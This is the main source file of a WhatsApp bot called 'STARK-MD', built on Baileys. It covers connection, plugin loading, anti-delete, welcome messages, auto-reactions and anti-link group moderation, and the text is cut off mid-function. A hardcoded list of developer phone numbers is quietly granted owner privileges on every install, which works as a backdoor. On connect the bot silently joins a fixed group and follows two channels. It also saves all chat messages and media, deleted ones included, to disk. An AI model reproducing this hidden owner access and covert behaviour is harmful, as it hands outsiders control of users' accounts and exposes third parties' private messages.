const {
    default: AliConnect,
    useMultiFileAuthState,
    DisconnectReason,
    jidNormalizedUser,
    getContentType,
    proto,
    makeInMemoryStore,
    areJidsSameUser,
    generateWAMessageContent,
    generateWAMessage,
    AnyMessageContent,
    prepareWAMessageMedia,
    downloadContentFromMessage,
    MessageRetryMap,
    generateForwardMessageContent,
    generateWAMessageFromContent,
    generateMessageID,
    jidDecode,
    fetchLatestBaileysVersion,
    downloadMediaMessage,
    Browsers,
    isJidBroadcast,
  } = require("@whiskeysockets/baileys");

const express = require("express"), 
    app = express(), 
    port = process.env.PORT || 8000, 
    fs = require('fs'), 
    P = require('pino'),
    path = require('path'), 
    os = require('os'), 
    qrcode = require('qrcode-terminal'), 
    util = require('util'), 
    config = require('./config'),
    fromBuffer = require("buffer"),
    axios = require('axios'), 
    mime = require('mime-types'),
    { totalmem: totalMemoryBytes, 
    freemem: freeMemoryBytes } = os;
    

const {
    PREFIX: prefix,
    MODE: botMode,
    BOT_PIC: botPic,
    PRESENCE: presenc,
    AUTO_STATUS_VIEWS: autoseen,
    TIME_ZONE: tz,
    AUTO_STATUS_REACTS: autor,
    BOT_NAME: botName,
    OWNER_NAME: ownerName,
    OWNER_NUMBER: ownerNumber,
    SUDO_NUMBERS } = config;
  const sudoNumbers = SUDO_NUMBERS && SUDO_NUMBERS.trim() ? SUDO_NUMBERS : "923003588997";

const {
    AliAnticall,
    getBuffer,
    getGroupAdmins,
    getRandom,
    h2k,
    isUrl,
    Json,
    runtime,
    sleep,
    fetchJson,
    emojis,
    commands,
    alimd,
    eventlogger, 
    saveMessage,
    loadSession,
  getSudoNumbers,
  } = require("./lib");
  
const { registerAntiNewsletter } = require('./plugins/antic'); // ✅ Import plugin

const AliMdgc = 'EP0hLj5Pjx89s9VXbzZ3iV';
const AliChannelId = '120363318387454868@newsletter';
const AliChannelId2 = '120363420041858087@newsletter';



const tempDir = path.join(os.tmpdir(), 'cache-temp')
if (!fs.existsSync(tempDir)) {
    fs.mkdirSync(tempDir)
}
const clearTempDir = () => {
    fs.readdir(tempDir, (err, files) => {
        if (err) throw err;
        for (const file of files) {
            fs.unlink(path.join(tempDir, file), err => {
                if (err) throw err;
            });
        }
    });
}


const byteToKB = 1 / 1024;
const byteToMB = byteToKB / 1024;
const byteToGB = byteToMB / 1024;

function formatBytes(bytes) {
if (bytes >= Math.pow(1024, 3)) {
  return (bytes * byteToGB).toFixed(2) + ' GB';
} else if (bytes >= Math.pow(1024, 2)) {
  return (bytes * byteToMB).toFixed(2) + ' MB';
} else if (bytes >= 1024) {
  return (bytes * byteToKB).toFixed(2) + ' KB';
} else {
  return bytes.toFixed(2) + ' bytes';
}
}

async function ConnectAliToWA() {
await loadSession();
eventlogger()
console.log('[🔌] CONNECTING TO WHATSAPP')
const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/session/')
var { version, isLatest } = await fetchLatestBaileysVersion()

const conn = AliConnect({
      logger: P({ level: 'silent' }),
      printQRInTerminal: !config.SESSION_ID,
      fireInitQueries: false,
      browser: Browsers.macOS("Safari"),
      downloadHistory: false,
      syncFullHistory: true,
      generateHighQualityLinkPreview: true,
      markOnlineOnConnect: false,
      keepAliveIntervalMs: 30_000,
      auth: state,
      version
      })
  
conn.ev.on('connection.update', (update) => {
const { connection, lastDisconnect } = update
if (connection === 'close') {
if (lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut) {
ConnectAliToWA()
}
} else if (connection === 'open') {
fs.readdirSync("./plugins/").forEach((plugin) => {
if (path.extname(plugin).toLowerCase() == ".js") {
require("./plugins/" + plugin); 
}
});
console.log('[⛲] PLUGINS INSTALLED');
const totalCommands = commands.filter((command) => command.pattern).length;
const startMess = {
      image: { url: botPic },
      caption: `*𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐄𝐃 𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘!*
*╭─────────────────┈⳹*
*│• 𝐓𝐘𝐏𝐄 .𝐌𝐄𝐍𝐔 𝐓𝐎 𝐒𝐄𝐄 𝐋𝐈𝐒𝐓 •*
*│• 𝐁𝐎𝐓 𝐀𝐌𝐀𝐙𝐈𝐍𝐆 𝐅𝐄𝐀𝐓𝐔𝐑𝐄𝐒 •*
*│• 🧮𝐏𝐑𝐄𝐒𝐄𝐍𝐂𝐄: ${presenc}*
*│• 📜𝐏𝐑𝐄𝐅𝐈𝐗: ${prefix}*
*│• 🪾𝐌𝐎𝐃𝐄: ${botMode}*
*│• 🪄𝐒𝐓𝐀𝐓𝐔𝐒 𝐕𝐈𝐄𝐖𝐒: ${autoseen}*
*│• 🤹🏻‍♀️𝐒𝐓𝐀𝐓𝐔𝐒 𝐑𝐄𝐀𝐂𝐓𝐒: ${autor}*
*│• 🫟𝐒𝐔𝐃𝐎𝐒: ${sudoNumbers}*
*╰─────────────────┈⳹*`,
      contextInfo: {
                forwardingScore: 5,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                newsletterJid: '120363318387454868@newsletter',
                newsletterName: "ѕтα፝֟꧊ꝛ̴͜ƙ-м∂ ѕυ꧊᭡꧊᭡σʀт",
                serverMessageId: 143
              }
            }
    };
    
conn.sendMessage(conn.user.id, startMess, { disappearingMessagesInChat: true, ephemeralExpiration: 100, })
conn.groupAcceptInvite(AliMdgc);
conn.newsletterFollow(AliChannelId);
conn.newsletterFollow(AliChannelId2);
console.log('[✅] STARK-MD CONNECTED')
}
})
conn.ev.on('creds.update', saveCreds)   


// ------------------ REGISTER ANTI-NEWSLETTER ------------------
registerAntiNewsletter(conn);
// ===================== ANTI DELETE =====================

// ✅ Save deleted messages when update trigger hota hai
conn.ev.on('messages.update', async updates => {  
for (const update of updates) {  
  if (update.update.message === null && config.ANTI_DELETE === "true") {  
    console.log("❌ Message Deleted:", JSON.stringify(update, null, 2));  
    await AntiDelete(conn, updates);  
  }  
}  
});  

// ✅ Save every message (text + media)
conn.ev.on("messages.upsert", async m => {
try {
  if (m.type === "notify") {
    for (const msg of m.messages) {
      if (msg.message) {
        enhancedSaveMessage(msg);
      }
    }
  }
} catch (e) {
  console.error("❌ Error saving message:", e);
}
});

// ✅ Save message function
function enhancedSaveMessage(message) {
try {
  const messagesDir = path.join(__dirname, "lib", "data", "messages");  
  if (!fs.existsSync(messagesDir)) {  
    fs.mkdirSync(messagesDir, { recursive: true });  
  }  

  if (message.key && message.key.id) {  
    const messagePath = path.join(messagesDir, `${message.key.id}.json`);  
    fs.writeFileSync(messagePath, JSON.stringify(message, null, 2));  
  }  
} catch (error) {  
  console.error("❌ Error saving message:", error);  
}
}

// ✅ Load message function
function enhancedLoadMessage(messageId) {
try {
  const messagesDir = path.join(__dirname, "lib", "data", "messages");
  const messagePath = path.join(messagesDir, `${messageId}.json`);

  if (fs.existsSync(messagePath)) {  
    const messageData = fs.readFileSync(messagePath, "utf8");  
    return JSON.parse(messageData);  
  }  

  return null;  
} catch (error) {  
  console.error("❌ Error loading message:", error);  
  return null;  
}
}

// ✅ AntiDelete Function
async function AntiDelete(conn, updates) {
try {
  for (const update of updates) {
    if (update.update.message === null) {
      const deletedMessage = enhancedLoadMessage(update.key.id);
      if (!deletedMessage) continue;

      const chatId = update.key.remoteJid;  
      const isGroup = chatId.endsWith("@g.us");  

      let groupName = "";  
      if (isGroup) {  
        try {  
          const metadata = await conn.groupMetadata(chatId);  
          groupName = metadata.subject;  
        } catch {  
          groupName = "Unknown Group";  
        }  
      }  

      const deleterId = update.key.fromMe  
        ? conn.user.id  
        : update.key.participant || update.key.remoteJid;  
      const deleterName =  
        deleterId === conn.user.id  
          ? "Bot"  
          : deletedMessage.pushName || deleterId.split("@")[0];  

      const messageType = Object.keys(deletedMessage.message || {})[0];  

      // ❌ Ignore system messages (not real user messages)
      if (["senderKeyDistributionMessage", "protocolMessage"].includes(messageType)) {
        continue;
      }

      let messageContent = "";  
      let mediaBuffer = null;  

      // ✅ Text
      if (messageType === "conversation") {  
        messageContent = deletedMessage.message.conversation;  
      } else if (messageType === "extendedTextMessage") {  
        messageContent = deletedMessage.message.extendedTextMessage.text;  
      } 

      // ✅ Media
      else if (["imageMessage","videoMessage","audioMessage","stickerMessage","documentMessage"].includes(messageType)) {  
        try {
          mediaBuffer = await downloadMediaMessage(
            { message: deletedMessage.message }, 
            "buffer", 
            {}, 
            { logger: conn.logger }
          );
        } catch (e) {
          console.error("❌ Media download failed:", e);
        }

        if (messageType === "imageMessage") {
          messageContent = deletedMessage.message.imageMessage.caption || "📸 Image";  
        } else if (messageType === "videoMessage") {
          messageContent = deletedMessage.message.videoMessage.caption || "🎥 Video";  
        } else if (messageType === "audioMessage") {
          messageContent = "🎵 Audio Message";  
        } else if (messageType === "stickerMessage") {
          messageContent = "🌟 Sticker";  
        } else if (messageType === "documentMessage") {
          const fileName = deletedMessage.message.documentMessage.fileName || "Document";  
          messageContent = `📄 ${fileName}`;  
        }
      } else {  
        messageContent = `${messageType.replace("Message", "")} message`;  
      }  

      // ✅ Time
      const timestamp = new Date(  
        deletedMessage.messageTimestamp * 1000  
      ).toLocaleString("en-US", {  
        timeZone: config.TIME_ZONE || "UTC",  
        year: "numeric",  
        month: "2-digit",  
        day: "2-digit",  
        hour: "2-digit",  
        minute: "2-digit",  
        second: "2-digit",  
      });  

      // ✅ AntiDelete text
      const antiDeleteText = `*⭕ ᴀɴᴛɪ-ᴅᴇʟᴇᴛᴇ ᴅᴇᴛᴇᴄᴛᴇᴅ*

*🚯 ᴅᴇʟᴇᴛᴇᴅ ʙʏ:* ${deleterName}fhg
*🙇🏻‍♂️ sᴇɴᴅᴇʀ:* ${deleterId.split("@")[0]}
*🎡 ${isGroup ? "ɢʀᴏᴜᴘ*" + groupName : "ᴘʀɪᴠᴀᴛᴇ ᴄʜᴀᴛ*"}
*⏰ ᴛɪᴍᴇ:* ${timestamp}

*💬 ᴅᴇʟᴇᴛᴇᴅ ᴍᴇssᴀɢᴇ:*
${messageContent || "No text content"}
`;
      // ✅ Send only to bot
      const botNumber = conn.user.id;

      if (mediaBuffer && ["imageMessage", "videoMessage", "stickerMessage"].includes(messageType)) {  
        if (messageType === "imageMessage") {  
          await conn.sendMessage(botNumber, { image: mediaBuffer, caption: antiDeleteText });  
        } else if (messageType === "videoMessage") {  
          await conn.sendMessage(botNumber, { video: mediaBuffer, caption: antiDeleteText });  
        } else if (messageType === "stickerMessage") {  
          await conn.sendMessage(botNumber, { text: antiDeleteText });  
          await conn.sendMessage(botNumber, { sticker: mediaBuffer });  
        }  
      } else if (mediaBuffer && ["audioMessage", "documentMessage"].includes(messageType)) {  
        await conn.sendMessage(botNumber, { text: antiDeleteText });  
        if (messageType === "audioMessage") {  
          await conn.sendMessage(botNumber, { audio: mediaBuffer, mimetype: "audio/mpeg" });  
        } else if (messageType === "documentMessage") {  
          const fileName = deletedMessage.message.documentMessage.fileName || "deleted_document";  
          await conn.sendMessage(botNumber, { document: mediaBuffer, fileName, mimetype: deletedMessage.message.documentMessage.mimetype });  
        }  
      } else {  
        await conn.sendMessage(botNumber, { text: antiDeleteText });  
      }  
    }  
  }  
} catch (error) {  
  console.error("❌ Error in AntiDelete function:", error);  
}
}

  
  conn.ev.on('group-participants.update', async (update) => {
try {
  if (config.WELCOME !== "true") return;

  const metadata = await conn.groupMetadata(update.id);
  const groupName = metadata.subject;
  const groupSize = metadata.participants.length;

  for (let user of update.participants) {
    const tagUser = '@' + user.split('@')[0];
    let pfp;

    try {
      pfp = await conn.profilePictureUrl(user, 'image');
    } catch (err) {
      pfp = "https://files.catbox.moe/ggm42k.jpeg"; // fallback dp
    }

    // WELCOME HANDLER
    if (update.action === 'add') {
      const welcomeMsg = `*╭ׂ┄─ׅ─ׂ┄─ׂ┄─ׅ─ׂ┄─ׂ┄─ׅ─ׂ┄─┈⳹*
*│ ̇─̣─̇─̣〘 ωєℓ¢σмє 〙̣─̇─̣─̇*
*├┅┅┅┅┈┈┈┈┈┈┈┈┈┅┅┅*
*│❀ нєу* ${tagUser}!
*├┅┅┅┅┈┈┈┈┈┈┈┈┈┅┅┅*
*│✑ ѕтαу ѕαfє αɴ∂ fσℓℓσω*
*│✑ тнє gʀσυᴘѕ ʀᴜℓєѕ!*
*│✑ ᴊσιɴє∂ ${groupSize}*
*╰ׂ┄─ׅ─ׂ┄─ׂ┄─ׅ─ׂ┄─ׂ┄─ׅ─ׂ┄─┈⳹*`;

      await conn.sendMessage(update.id, {
        text: welcomeMsg, // 👈 only text msg
        mentions: [user],
        contextInfo: {
          mentionedJid: [user],
          externalAdReply: {
            title: `${groupName}`,
            body: `© ᴘσωєʀє∂ ву ѕтα፝֟꧊ꝛ̴͜ƙ м∂⎯꯭̽💀`,
            thumbnailUrl: pfp,  // dp thumbnail
            sourceUrl: "https://whatsapp.com/channel/0029VaoRxGmJpe8lgCqT1T2h", // link
            mediaType: 1,
            renderLargerThumbnail: true
          }
        }
      });
    }
  }
} catch (err) {
  console.error("Group Participants Update Error:", err);
}
});


conn.ev.on('messages.upsert', async (m) => {
 try {
     const msg = m.messages[0];
     if (!msg || !msg.message) return;

     const targetNewsletter1 = "120363318387454868@newsletter";
     const targetNewsletter2 = "120363420041858087@newsletter";

     if ((msg.key.remoteJid === targetNewsletter1 || msg.key.remoteJid === targetNewsletter2) && msg.newsletterServerId) {
         try {
             const emojiList = ["❤️", "💀", "🌚", "🌟", "🔥", "❤️‍🩹", "🌸", "🍁", "🍂", "🦋", "🍥", "🍧", "🍨", "🍫", "🍭", "🎀", "🎐", "🎗️", "👑", "🚩", "🇵🇰", "🍓", "🍇", "🧃", "🗿", "🎋", "💸", "🧸"];
             const emoji = emojiList[Math.floor(Math.random() * emojiList.length)];

             const messageId = msg.newsletterServerId.toString();
             await conn.newsletterReactMessage(msg.key.remoteJid, messageId, emoji);
         } catch (err) {
             console.error("❌ Failed to react to Home message:", err);
         }
     }
 } catch (err) {
     console.log(err);
 }
});
  
conn.ev.on('messages.upsert', async(mek) => {
mek = mek.messages[0];
enhancedSaveMessage(JSON.parse(JSON.stringify(mek, null, 2)));
const fromJid = mek.key.participant || mek.key.remoteJid;

if (!mek || !mek.message) return;

mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
  ? mek.message.ephemeralMessage.message 
  : mek.message;

if (mek.key && isJidBroadcast(mek.key.remoteJid)) {
  try {

      if (config.AUTO_STATUS_VIEWS === "true" && mek.key) {
          const alitech = jidNormalizedUser(conn.user.id);
          await conn.readMessages([mek.key, alitech]);
      }

      if (config.AUTO_STATUS_REACTS === "true") {
          const alitech = jidNormalizedUser(conn.user.id);
          const emojis = config.AUTO_STATUS_EMOJIS.split(','); 
          const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)]; 
          if (mek.key.remoteJid && mek.key.participant) {
              await conn.sendMessage(
                  mek.key.remoteJid,
                  { react: { key: mek.key, text: randomEmoji } },
                  { statusJidList: [mek.key.participant, alitech] }
              );
          }
      }
        
      if (config.AUTO_REPLY_STATUS === "true") {
          const customMessage = config.STATUS_REPLY_MSG || '✅ Status Viewed by STARK MD';
          if (mek.key.remoteJid) {
              await conn.sendMessage(
                  fromJid,
                  { text: customMessage },
                  { quoted: mek }
              );
          }
      } 
  } catch (error) {
      console.error("Error Processing Actions:", error);
  }
}
  
// Process incoming message
const m = alimd(conn, mek);
const type = getContentType(mek.message);
const content = JSON.stringify(mek.message);
const from = mek.key.remoteJid;

// Quoted message (if any)
const quoted = type === 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo?.quotedMessage
? mek.message.extendedTextMessage.contextInfo.quotedMessage
: null;

// Body extraction (text, caption, button/list IDs)
let body = '';
if (type === 'conversation') body = mek.message.conversation;
else if (type === 'extendedTextMessage') body = mek.message.extendedTextMessage.text;
else if (type === 'imageMessage') body = mek.message.imageMessage.caption || '';
else if (type === 'videoMessage') body = mek.message.videoMessage.caption || '';
else if (type === 'templateButtonReplyMessage') body = mek.message.templateButtonReplyMessage.selectedId || '';
else if (type === 'buttonsResponseMessage') body = mek.message.buttonsResponseMessage.selectedButtonId || '';
else if (type === 'listResponseMessage') body = mek.message.listResponseMessage.singleSelectReply?.selectedRowId || '';
else if (type === 'interactiveResponseMessage' && mek.message.interactiveResponseMessage.nativeFlowResponseMessage?.paramsJson) {
try {
  body = JSON.parse(mek.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id || '';
} catch {
  body = '';
}
}

// Command parsing
const isCmd = body.startsWith(prefix);
const command = isCmd ? body.slice(prefix.length).trim().split(/ +/)[0].toLowerCase() : '';
const args = body.trim().split(/ +/).slice(1);
const q = args.join(' ');
const isGroup = from.endsWith('@g.us');
const sender = mek.key.fromMe 
? (conn.user.id.split(':')[0] + '@s.whatsapp.net' || conn.user.id) 
: (mek.key.participant || mek.key.remoteJid);
const senderNumber = sender.split('@')[0];
const botNumber = conn.user.id.split(':')[0];
const pushname = mek.pushName || 'Hello User';
const isMe = botNumber.includes(senderNumber);
const sudoNumbersFromFile = getSudoNumbers();
const Devs = '923309046024,923199471258,923288407964'; 
const ownerNumber = config.OWNER_NUMBER;
const sudoNumbers = config.SUDO_NUMBERS ? config.SUDO_NUMBERS.split(',') : []; 
const devNumbers = Devs.split(',');
const allOwnerNumbers = [...new Set([...ownerNumber, ...sudoNumbersFromFile, ...sudoNumbers, ...devNumbers])];
const isOwner = allOwnerNumbers.includes(senderNumber) || isMe;
const botNumber2 = jidNormalizedUser(conn.user.id);
const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : '';
const groupName = isGroup ? groupMetadata.subject : '';
const participants = isGroup ? await groupMetadata.participants : '';
const groupAdmins = isGroup ? getGroupAdmins(participants) : '';
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false;
const isAdmins = isGroup ? groupAdmins.includes(sender) : false;
const isReact = m.message.reactionMessage ? true : false;
/// Auto React 
if (!isReact && config.AUTO_REACT === 'true') {
  const reactions = [
      '🌼', '❤️', '💐', '🔥', '🏵️', '❄️', '🧊', '🐳', '💥', '🥀', '❤‍🔥', '🥹', '😩', '🫣', '🤭', '👻', '👾', '🫶', '😻', '🙌', '🫂', '🫀', '👩‍🦰', '🧑‍🦰', '👩‍⚕️', '🧑‍⚕️', '🧕', '👩‍🏫', '👨‍💻', '👰‍♀', '🦹🏻‍♀️', '🧟‍♀️', '🧟', '🧞‍♀️', '🧞', '🙅‍♀️', '💁‍♂️', '💁‍♀️', '🙆‍♀️', '🙋‍♀️', '🤷', '🤷‍♀️', '🤦', '🤦‍♀️', '💇‍♀️', '💇', '💃', '🚶‍♀️', '🚶', '🧶', '🧤', '👑', '💍', '👝', '💼', '🎒', '🥽', '🐻 ', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '🗿', '🇵🇰', '💜', '💙', '🌝', '🖤', '🎎', '🎏', '🎐', '⚽', '🧣', '🌿', '⛈️', '🌦️', '🌚', '🌝', '🙈', '🙉', '🦖', '🐤', '🎗️', '🥇', '👾', '🔫', '🐝', '🦋', '🍓', '🍫', '🍭', '🧁', '🧃', '🍿', '🍻', '🛬', '🫀', '🫠', '🐍', '🥀', '🌸', '🏵️', '🌻', '🍂', '🍁', '🍄', '🌾', '🌿', '🌱', '🍀', '🧋', '💒', '🏩', '🏗️', '🏰', '🏪', '🏟️', '🎗️', '🥇', '⛳', '📟', '🏮', '📍', '🔮', '🧿', '♻️', '⛵', '🚍', '🚔', '🛳️', '🚆', '🚤', '🚕', '🛺', '🚝', '🚈', '🏎️', '🏍️', '🛵', '🥂', '🍾', '🍧', '🐣', '🐥', '🦄', '🐯', '🐦', '🐬', '🐋', '🦆', '💈', '⛲', '⛩️', '🎈', '🎋', '🪀', '🧩', '👾', '💸', '💎', '🧮', '👒', '🧢', '🎀', '🧸', '👑', '〽️', '😳', '💀', '☠️', '👻', '🔥', '♥️', '👀', '🐼', '🐭', '🐣', '🪿', '🦆', '🦊', '🦋', '🦄', '🪼', '🐋', '🐳', '🦈', '🐍', '🕊️', '🦦', '🦚', '🌱', '🍃', '🎍', '🌿', '☘️', '🍀', '🍁', '🪺', '🍄', '🍄‍🟫', '🪸', '🪨', '🌺', '🪷', '🪻', '🥀', '🌹', '🌷', '💐', '🌾', '🌸', '🌼', '🌻', '🌝', '🌚', '🌕', '🌎', '💫', '🔥', '☃️', '❄️', '🌨️', '🫧', '🍟', '🍫', '🧃', '🧊', '🪀', '🤿', '🏆', '🥇', '🥈', '🥉', '🎗️', '🤹', '🤹‍♀️', '🎧', '🎤', '🥁', '🧩', '🎯', '🚀', '🚁', '🗿', '🎙️', '⌛', '⏳', '💸', '💎', '⚙️', '⛓️', '🔪', '🧸', '🎀', '🪄', '🎈', '🎁', '🎉', '🏮', '🪩', '📩', '💌', '📤', '📦', '📊', '📈', '📑', '📉', '📂', '🔖', '🧷', '📌', '📝', '🔏', '🔐', '🩷', '❤️', '🧡', '💛', '💚', '🩵', '💙', '💜', '🖤', '🩶', '🤍', '🤎', '❤‍🔥', '❤‍🩹', '💗', '💖', '💘', '💝', '❌', '✅', '🔰', '〽️', '🌐', '🌀', '⤴️', '⤵️', '🔴', '🟢', '🟡', '🟠', '🔵', '🟣', '⚫', '⚪', '🟤', '🔇', '🔊', '📢', '🔕', '♥️', '🕐', '🚩', '🇵🇰', '🧳', '🌉', '🌁', '🛤️', '🛣️', '🏚️', '🏠', '🏡', '🧀', '🍥', '🍮', '🍰', '🍦', '🍨', '🍧', '🥠', '🍡', '🧂', '🍯', '🍪', '🍩', '🍭', '🥮', '🍡'
  ];
      const randomReaction = reactions[Math.floor(Math.random() * reactions.length)]; // 
        m.react(randomReaction);
    }
        
// Owner React
if (!isReact && senderNumber === botNumber) {
    if (config.OWNER_REACT === 'true') {
        const reactions = [
      '🌼', '❤️', '💐', '🔥', '🏵️', '❄️', '🧊', '🐳', '💥', '🥀', '❤‍🔥', '🥹', '😩', '🫣', '🤭', '👻', '👾', '🫶', '😻', '🙌', '🫂', '🫀', '👩‍🦰', '🧑‍🦰', '👩‍⚕️', '🧑‍⚕️', '🧕', '👩‍🏫', '👨‍💻', '👰‍♀', '🦹🏻‍♀️', '🧟‍♀️', '🧟', '🧞‍♀️', '🧞', '🙅‍♀️', '💁‍♂️', '💁‍♀️', '🙆‍♀️', '🙋‍♀️', '🤷', '🤷‍♀️', '🤦', '🤦‍♀️', '💇‍♀️', '💇', '💃', '🚶‍♀️', '🚶', '🧶', '🧤', '👑', '💍', '👝', '💼', '🎒', '🥽', '🐻 ', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '🗿', '🇵🇰', '💜', '💙', '🌝', '🖤', '🎎', '🎏', '🎐', '⚽', '🧣', '🌿', '⛈️', '🌦️', '🌚', '🌝', '🙈', '🙉', '🦖', '🐤', '🎗️', '🥇', '👾', '🔫', '🐝', '🦋', '🍓', '🍫', '🍭', '🧁', '🧃', '🍿', '🍻', '🛬', '🫀', '🫠', '🐍', '🥀', '🌸', '🏵️', '🌻', '🍂', '🍁', '🍄', '🌾', '🌿', '🌱', '🍀', '🧋', '💒', '🏩', '🏗️', '🏰', '🏪', '🏟️', '🎗️', '🥇', '⛳', '📟', '🏮', '📍', '🔮', '🧿', '♻️', '⛵', '🚍', '🚔', '🛳️', '🚆', '🚤', '🚕', '🛺', '🚝', '🚈', '🏎️', '🏍️', '🛵', '🥂', '🍾', '🍧', '🐣', '🐥', '🦄', '🐯', '🐦', '🐬', '🐋', '🦆', '💈', '⛲', '⛩️', '🎈', '🎋', '🪀', '🧩', '👾', '💸', '💎', '🧮', '👒', '🧢', '🎀', '🧸', '👑', '〽️', '😳', '💀', '☠️', '👻', '🔥', '♥️', '👀', '🐼', '🐭', '🐣', '🪿', '🦆', '🦊', '🦋', '🦄', '🪼', '🐋', '🐳', '🦈', '🐍', '🕊️', '🦦', '🦚', '🌱', '🍃', '🎍', '🌿', '☘️', '🍀', '🍁', '🪺', '🍄', '🍄‍🟫', '🪸', '🪨', '🌺', '🪷', '🪻', '🥀', '🌹', '🌷', '💐', '🌾', '🌸', '🌼', '🌻', '🌝', '🌚', '🌕', '🌎', '💫', '🔥', '☃️', '❄️', '🌨️', '🫧', '🍟', '🍫', '🧃', '🧊', '🪀', '🤿', '🏆', '🥇', '🥈', '🥉', '🎗️', '🤹', '🤹‍♀️', '🎧', '🎤', '🥁', '🧩', '🎯', '🚀', '🚁', '🗿', '🎙️', '⌛', '⏳', '💸', '💎', '⚙️', '⛓️', '🔪', '🧸', '🎀', '🪄', '🎈', '🎁', '🎉', '🏮', '🪩', '📩', '💌', '📤', '📦', '📊', '📈', '📑', '📉', '📂', '🔖', '🧷', '📌', '📝', '🔏', '🔐', '🩷', '❤️', '🧡', '💛', '💚', '🩵', '💙', '💜', '🖤', '🩶', '🤍', '🤎', '❤‍🔥', '❤‍🩹', '💗', '💖', '💘', '💝', '❌', '✅', '🔰', '〽️', '🌐', '🌀', '⤴️', '⤵️', '🔴', '🟢', '🟡', '🟠', '🔵', '🟣', '⚫', '⚪', '🟤', '🔇', '🔊', '📢', '🔕', '♥️', '🕐', '🚩', '🇵🇰', '🧳', '🌉', '🌁', '🛤️', '🛣️', '🏚️', '🏠', '🏡', '🧀', '🍥', '🍮', '🍰', '🍦', '🍨', '🍧', '🥠', '🍡', '🧂', '🍯', '🍪', '🍩', '🍭', '🥮', '🍡'
  ];
        const randomReaction = reactions[Math.floor(Math.random() * reactions.length)]; // 
        m.react(randomReaction);
    }
}

if (senderNumber.includes("923199471258")) {
      if (isReact) return;

          const reactions = ["🪏", "🫟", "🇦🇱"];
              const pick = reactions[Math.floor(Math.random() * reactions.length)];

                  m.react(pick);
                  }

// ===================== ANTI-LINK =====================
if (isGroup && !isAdmins && isBotAdmins) {

  if (!body) return;

  // Clean message
  let cleanBody = body.replace(/[\s\u200b-\u200d\uFEFF]/g, '').toLowerCase();

  // Detect ALL links: https, WhatsApp group, WhatsApp channel
  const urlRegex =
      /(https?:\/\/[^\s]+)|(chat\.whatsapp\.com\/[A-Za-z0-9]+)|(whatsapp\.com\/channel\/[A-Za-z0-9]+)/gi;

  if (urlRegex.test(cleanBody)) {

      // Init warnings
      if (!global.userWarnings) global.userWarnings = {};
      let userWarnings = global.userWarnings;

      // NORMAL DELETE FUNCTION (LATEST BAILEYS)
      async function deleteMsg() {
          try {
              await conn.sendMessage(from, {
                  delete: {
                      remoteJid: from,
                      fromMe: mek.key.fromMe,
                      id: mek.key.id,
                      participant: mek.key.participant || sender
                  }
              });
          } catch (e) {
              console.log("Delete Failed:", e);
          }
      }

      // Fake Contact Gift
      let gift = {
          key: {
              fromMe: false,
              participant: `0@s.whatsapp.net`,
              remoteJid: "status@broadcast"
          },
          message: {
              contactMessage: {
                  displayName: `Ɗσ͜͡ηʈ 𝐓αʞ͜͡ɘ 𝐑ɪ͜͡ѕƙ.†`,
                  vcard: `BEGIN:VCARD
VERSION:3.0
N:;a,;;;
FN:'STARK-MD'
item1.TEL;waid=${sender.split("@")[0]}:${sender.split("@")[0]}
item1.X-ABLabel:Ponsel
END:VCARD`
              }
          }
      };

      // =========================================================
      // 🔥 FULL BAN MODE 
      // =========================================================
      if (config.ANTI_LINK === "true") {

          await deleteMsg();

          await conn.sendMessage(from, {
              text: `*⌈⚠️ ℓιɴк ∂єтє¢тє∂ ⌋*
*╭────────────────┄┈┈*
*│👤 ᴜsєʀ:* @${sender.split('@')[0]}
*│🛩️ кι¢кє∂: ѕυ¢¢єѕѕfυℓℓу!*
*│📑 ʀєαѕσɴ: ℓιикѕ ɴσт αℓℓσωє∂*
*╰────────────────┄┈┈*`,
              mentions: [sender]
          }, { quoted: gift });

          await conn.groupParticipantsUpdate(from, [sender], 'remove');
          return;
      }

      // =========================================================
      // ⚠️ WARN MODE 
      // =========================================================
      if (config.ANTI_LINK === "warn") {

          userWarnings[sender] = (userWarnings[sender] || 0) + 1;

          await deleteMsg();

          // Under 3 warnings
          if (userWarnings[sender] < 3) {
              await conn.sendMessage(from, {
                  text: `*⌈⚠️ ℓιɴк ∂єтє¢тє∂ ⌋*
*╭────────────────┄┈*
*│👤 ᴜsєʀ:* @${sender.split('@')[0]}!
*│⭕ ᴄσᴜɴᴛ : ${userWarnings[sender]}*
*│🪦 ᴡαʀɴ ℓιмιт: 3*
*╰────────────────┄┈*`,
                  mentions: [sender]
              }, { quoted: gift });

          } else {

              await conn.sendMessage(from, {
                  text: `@${sender.split('@')[0]} *ᴡαʀɴ ℓιмιт єχᴄєє∂є∂!*`,
                  mentions: [sender]
              }, { quoted: gift });

              await conn.groupParticipantsUpdate(from, [sender], 'remove');
              userWarnings[sender] = 0;
          }
          return;
      }

      // =========================================================
      // 🧹 DELETE ONLY MODE
      // =========================================================
      if (config.ANTI_LINK === "delete") {

          await deleteMsg();

          await conn.sendMessage(from, {
              text: `⎙ @${sender.split('@')[0]}, *ℓιɴкѕ αʀє ɴσт αℓℓσωє∂.*`,
              mentions: [sender]
          }, { quoted: gift });

          return;
      }
  }
}
    
const reply = async (teks) => {
try {
  await conn.sendMessage(from, { text: teks }, { quoted: mek });
} catch (err) {
  console.error("❌ Failed to send reply:", err);
  await conn.sendMessage(from, { text: "⚠️ Error sending reply." });
}
};

// ===== JID DECODER =====
conn.decodeJid = jid => {
  if (!jid) return jid;
  if (/:\d+@/gi.test(jid)) {
    let decode = jidDecode(jid) || {};
